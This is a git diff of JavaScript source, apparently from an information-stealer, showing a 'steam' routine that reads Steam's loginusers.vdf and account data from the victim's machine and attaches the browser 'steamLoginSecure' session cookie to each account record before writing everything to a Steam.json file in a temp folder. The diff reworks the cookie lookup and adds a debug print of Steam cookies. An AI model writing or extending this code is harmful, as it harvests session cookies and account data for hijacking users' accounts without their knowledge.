@@ -50,9 +50,6 @@ const reddit = async () => {
 };
 
 const steam = async () => {
-  if (!(await cookies).find(cookie => cookie.host.includes('steam'))) return;
-  const { value: cookie } = (await cookies).find(cookie => cookie.host.includes('store.steampowered.com') && cookie.name === 'steamLoginSecure');
-  const userId = cookie?.match(/7656[0-9]{13}/gi)[0];
   const steamBasePath = join('C:', 'Program Files (x86)', 'Steam');
   if (fs.existsSync(steamBasePath) && fs.existsSync(join(steamBasePath, 'config')) && fs.existsSync(join(steamBasePath, 'config', 'loginusers.vdf'))) {
     fs.writeFileSync(join(tempFolder, 'Steam.json'), '[]');
@@ -67,7 +64,12 @@ const steam = async () => {
       accountsFile.push({
         accountId: account, accountInfo, games, level
       });
-      if (cookie) accountsFile.find(account => account.accountId === userId).cookie = cookie;
+      console.log((await cookies).find(cookie => cookie.host.includes('steam')));
+      const cookie = (await cookies).find(cookie => cookie.host.includes('store.steampowered.com') && cookie.name === 'steamLoginSecure')?.value;
+      if (cookie) {
+        const userId = cookie?.match(/7656[0-9]{13}/gi)[0];
+        accountsFile.find(account => account.accountId === userId).cookie = cookie;
+      }
       fs.writeFileSync(join(tempFolder, 'Steam.json'), JSON.stringify(accountsFile));
     });
   }
